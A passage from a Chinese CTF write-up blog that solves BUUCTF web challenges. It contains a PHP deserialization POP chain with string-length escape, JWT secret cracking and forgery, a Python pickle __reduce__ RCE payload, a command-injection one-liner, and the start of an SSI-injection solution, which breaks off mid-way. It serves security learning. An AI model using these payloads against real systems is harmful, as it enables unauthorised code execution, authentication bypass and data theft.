<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里暂时还不知道如何实例化和实例化哪一个类，所一接着往下看UpdateHelper类：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果发现了一个反序列化函数，里面又$newInfo参数，找找是从哪里传入的，最后在user类里面面的update方法中调用了UpdateHelper类：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">    <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以newInfo肯定就是传进来的session[‘id’]这个值了，但是这个值服务器才能使用，这里控制不了。<br>然后看到UpdateHelper类里面有一个<code>echo $this-&gt;sql;</code>这个sql便是我们传入<code>__construct($newInfo,$sql)</code>里的$sql。<br>接着看一下unserialize里的$this-&gt;getNewinfo()参数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的$age和$nickname没有任何过滤，所以我们可以任意输入，这时候便可以构思：当我们在update.php页面POST一个反序列化后的UpdateHelper对象，当其销毁时会调用UpdateHelper里面的析构方法，然后输出$this-&gt;sql，这是一个字符串，如果$this-&gt;sql为一个User类的对象便可以触发__tostring方法。<br>然后尝试构造一部分POC:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user = <span class="keyword">new</span> User();		<span class="comment">//新建一个user对象</span></span><br><span class="line">$payload =  <span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$pauload-&gt;sql = $user;</span><br></pre></td></tr></table></figure>

<p>接下来就是先办法调用call方法，要求是咱们能够访问一个对象不存在的方法，这里tostring访问的方法是在User类里面，而call是在Info类里面，所以$this-&gt;nickname是Info类的时候便可以触发这个call。所以，当nickname是一个Info类的对象的时候，就会调用Info类里的call，使得$this-&gt;CtrlCase访问login。<br>这里有两个login，一个是User类里面的，一个是dbCtrl类里面的,但是不难发现User里面的login方法其实也是调用的dbCurl类里面的login方法。<br>所以$this-&gt;CtrlCase应该赋值一个dbCurl对象，所以我们可以再次尝试构造一下poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user = <span class="keyword">new</span> User();</span><br><span class="line">$user-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> dbCurl();</span><br><span class="line">$user-&gt;nickname-&gt;CtrlCase = $db;</span><br><span class="line"></span><br><span class="line">$payload =  <span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$pauload-&gt;sql = $user;</span><br></pre></td></tr></table></figure>

<p>然后看一下call方法的定义</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">(string $function_name, array $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 方法体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们知道触发call方法是因为将$this-&gt;nickname实例化为一个Info对象。所以这里的$name 便是update方法，而argument便是update函数里面的数组，argument[0]便是this-&gt;age值。然后再来看一下dbCtrl里面的登陆判断：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    <span class="keyword">return</span> $idResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的$this-&gt;password直接就是个public，接在实例化dbCtrl类的时候就赋值，这里的$passwordResult是<code>select id,password from user where username=?</code><br>这里的<code>?</code>是$this-&gt;name，可以赋值</p>
<p>SQL语句是从call方法$this-&gt;CtrlCase-&gt;login($argument[0])里的argument[0]传进来的</p>
<p>这里的argument[0]是User类里面update方法里面的$this-&gt;age属性，又因为为了调用call方法，我们将<code>$user-&gt;nickname = new Info();</code>的值赋了一个Info对象，所以现在$this-&gt;age 属于Info对象</p>
<p>然后UpdateHelper对象里的sql属性被赋值了User对象</p>
<p>而UpdateHelper对象是由我们自己实例化后，再变成序列化字符串传进去的，传到update.php里执行了update方法被反序列化函数还原出来的，并且sql可控</p>
<blockquote>
<p>这里的sql查询语句为<code>select id,password from user where username=?</code><br>通过控制这里的sql执行语句即可通过登录的密码验证<br><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code><br>c4ca4238a0b923820dcc509a6f75849b是1的MD5值</p>
</blockquote>
<p>所以我们可以接着构造poc：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user = <span class="keyword">new</span> User();</span><br><span class="line">$user-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">$user-&gt;age = <span class="string">'select "1", "21232f297a57a5a743894a0e4a801fc3"'</span>;</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> dbCurl();</span><br><span class="line">$db-&gt;password = <span class="string">'admin'</span>;</span><br><span class="line">$db-&gt;name = <span class="string">'admin'</span>;</span><br><span class="line">$user-&gt;nickname-&gt;CtrlCase = $db;</span><br><span class="line"></span><br><span class="line">$payload =  <span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$pauload-&gt;sql = $user;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br></pre></td></tr></table></figure>

<p>但是Post进去是变成了实例化Info对象用的参数，达不到预期效果。所以这里要让字符串逃逸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>他把union等替换成了hacker，正好多出一个字符，那我如果根据序列化的规则添加字符，就可以多还原一个对象了</p>
<p>多一个对象需要添加”s:1:”1”;要的对像序列化字符串;</p>
<p>你要的对象序列化字符串已经有了，就是咱们辛苦构造的那个new UpdateHelper，直接serialize就可以得到</p>
<p>但是前面这个”s:1:”1”;呢，当然也是用反序列化长度逃逸了。</p>
<p>怎么构造这个溢出呢，就是你需要溢出多长，就写多少个union，每一个union被替换为hacker的时候，都可以为你增加一个字符的溢出长度。</p>
<p>所以最终的payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> $id;</span><br><span class="line">       <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> $age;</span><br><span class="line">       <span class="keyword">public</span> $nickname;</span><br><span class="line">       <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">        </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">$user = <span class="keyword">new</span> User();</span><br><span class="line">$user-&gt;age = <span class="string">'select "1", "21232f297a57a5a743894a0e4a801fc3"'</span>;</span><br><span class="line">$user-&gt;nickname = <span class="keyword">new</span> Info(<span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">$db = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$db-&gt;password = <span class="string">"admin"</span>;</span><br><span class="line">$db-&gt;name = <span class="string">"admin"</span>;</span><br><span class="line">$user-&gt;nickname-&gt;CtrlCase = $db;</span><br><span class="line">$payload = <span class="keyword">new</span> UpdateHelper(<span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">$payload-&gt;sql = $user;</span><br><span class="line">$payload_age = <span class="string">'unionunionunionunionunionunionunionunion";s:1:"1'</span>;</span><br><span class="line">$payload_nickname = <span class="string">'";'</span> . serialize($payload) . <span class="string">'&#125;'</span>;</span><br><span class="line">$payload_nickname = str_repeat(<span class="string">"union"</span>, strlen($payload_nickname)) . $payload_nickname;</span><br><span class="line"><span class="keyword">echo</span> $payload_nickname;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":1:&#123;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:46:"</span>select <span class="string">"1"</span>, <span class="string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";N;s:8:"</span>nickname<span class="string">";N;s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":2:&#123;s:8:"</span>password<span class="string">";s:5:"</span>admin<span class="string">";s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>最后使用POST传参：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">age=unionunionunionunionunionunionunionunion<span class="string">";s:1:"</span><span class="number">1</span>&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":1:&#123;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:46:"</span>select <span class="string">"1"</span>, <span class="string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";N;s:8:"</span>nickname<span class="string">";N;s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":2:&#123;s:8:"</span>password<span class="string">";s:5:"</span>admin<span class="string">";s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后admin，任意 密码登录便得到flag<br><img src="/2020/04/14/BUU-web4/4.png" alt><br><img src="/2020/04/14/BUU-web4/5.png" alt><br>参考文章：<a href="https://www.anquanke.com/post/id/200200#h2-2" target="_blank" rel="noopener">从春秋公益赛babyphp学习反序列化长度逃逸</a><br>这篇文章写的十分详细，花了一上午来学习，这道题做了接近一天，我再也不会相信什么easyphp了…..，但还是收获颇丰。<br>再收藏几篇文章，方便以后学习：</p>
<blockquote>
<p>  php框架反序列化练习<br><a href="https://www.jianshu.com/p/ab8bdce3b13a" target="_blank" rel="noopener">https://www.jianshu.com/p/ab8bdce3b13a</a></p>
<p>深入浅析PHP的session反序列化漏洞问题<br><a href="https://www.jb51.net/article/116246.htm" target="_blank" rel="noopener">https://www.jb51.net/article/116246.htm</a></p>
<p>南邮PHP反序列化<br><a href="https://www.cnblogs.com/nul1/p/9417484.html" target="_blank" rel="noopener">https://www.cnblogs.com/nul1/p/9417484.html</a></p>
<p>PHP反序列化入门之常见魔术方法<br><a href="https://www.codercto.com/a/57508.html" target="_blank" rel="noopener">https://www.codercto.com/a/57508.html</a>  </p>
<p>  1、POP链和序列化，反序列化操作<br><img src="file:///C:%5CUsers%5C%E5%8D%8E%E7%A1%95%5CAppData%5CRoaming%5CTencent%5CQQ%5CTemp%W@GJ$ACOF(TYDYECOKVDYB.png" alt="img"><a href="https://www.jianshu.com/p/e40b94f24361" target="_blank" rel="noopener">https://www.jianshu.com/p/e40b94f24361</a></p>
<p>2、代码审计知识星球<br><img src="file:///C:%5CUsers%5C%E5%8D%8E%E7%A1%95%5CAppData%5CRoaming%5CTencent%5CQQ%5CTemp%W@GJ$ACOF(TYDYECOKVDYB.png" alt="img"><a href="https://code-breaking.com/" target="_blank" rel="noopener">https://code-breaking.com/</a></p>
<p>3、PHP反序列化入门之寻找POP链（一）<br><a href="https://www.freebuf.com/column/203767.html" target="_blank" rel="noopener">https://www.freebuf.com/column/203767.html</a></p>
<p>4、PHP反序列化入门之寻找POP链（二）<br><a href="https://www.anquanke.com/post/id/170714" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170714</a></p>
</blockquote>
<h1 id="CISCN2019Web2-ikun"><a href="#CISCN2019Web2-ikun" class="headerlink" title="[CISCN2019Web2]ikun"></a>[CISCN2019Web2]ikun</h1><p><img src="/2020/04/14/BUU-web4/6.png" alt>网站提示我们 要买到lv6，随便点一个发现为/info/22的格式，我们可以写一个脚本来寻找有lv6。png的页面：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://d21410bc-a3cd-46d7-9459-af417562cf67.node3.buuoj.cn/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">  payload = url+str(i)</span><br><span class="line">  print(payload)</span><br><span class="line">  res = requests.get(payload)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">"lv6.png"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    print(payload)</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>在第181页发现了lv6<br><img src="/2020/04/14/BUU-web4/7.png" alt></p>
<p>很明显钱不够<img src="/2020/04/14/BUU-web4/8.png" alt><br>但是可以抓包修改折扣<br><img src="/2020/04/14/BUU-web4/9.png" alt><br>然后自动跳转到了<code>b1g_m4mber</code>页面，显示只有admin才能访问。这里涉及JWT破解<a href="https://www.cnblogs.com/cjsblog/p/9277677.html" target="_blank" rel="noopener">了解JWT</a><br>先抓包将JWT base64解码，得到username是自己的登陆名qqqq，这里需要改为admin<br>后边解码不出来因为经过了sha256，需要破解key<br>使用工具破的<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">破解工具</a>，在安装后先使用make编译一下<br>解密得到<code>Secret is &quot;1Kun&quot;</code><img src="/2020/04/14/BUU-web4/10.png" alt>|<br>然后伪造我们的jwt<a href="https://jwt.io/" target="_blank" rel="noopener">生成jwt的网站</a></p>
<p><img src="/2020/04/14/BUU-web4/11.png" alt></p>
<blockquote>
<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</p>
</blockquote>
<p>然后登录成功</p>
<p>然后得到了一个下载地址，将其下载下来<br><img src="/2020/04/14/BUU-web4/12.png" alt></p>
<p>然后在admin.py发现了一个python序列化的地方：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>这里用了Pickle协议的方法<code>__reduce__(self)</code><br><a href="https://blog.csdn.net/bluehawksky/article/details/79027055" target="_blank" rel="noopener">这是大佬讲python魔术方法的博客</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>

<p>这样就可以打印flag.txt里的内容了<br>将生成的payload传给become<br><img src="/2020/04/14/BUU-web4/13.png" alt></p>
<p><a href="https://blog.csdn.net/chasingin/article/details/103891849" target="_blank" rel="noopener">参考文章</a></p>
<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>此题为命令执行，该题可以使用||分隔符，没有过滤空格，使用cat或者tac来读取flag<br>payload:</p>
<blockquote>
<p>127.0.0.1 || tac ../../../flag</p>
</blockquote>
<p>得到flag<br><img src="/2020/04/14/BUU-web4/14.png" alt></p>
<h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>本题考查SSI注入</p>
<blockquote>
<p>（SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。IIS和Apache都可以开启SSI功能）</p>
<p>（SSI注入的条件：</p>
<p>1.Web 服务器已支持SSI（服务器端包含）</p>
<p>2.Web 应用程序未对对相关SSI关键字做过滤</p>
<p>3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）</p>
</blockquote>
<p>进入后是一个登录框，测试是否存在sql注入，但是并没有什么发现。扫描目录发现<code>index.php.swp</code>源码泄露</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span><br><span class="line">		$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		<span class="keyword">return</span> sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> $_POST[<span class="string">'username'</span>] != <span class="string">''</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">'6d0bc1'</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">'password'</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;</span><br><span class="line">            $file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">            $text = <span class="string">'</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="string">'username'</span>].<span class="string">'&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***'</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"[!] Header  error ..."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>审计之后发现password前6个字符的md5加密值等于6d0bc1，这里我们可以使用脚本MD5碰撞</p>
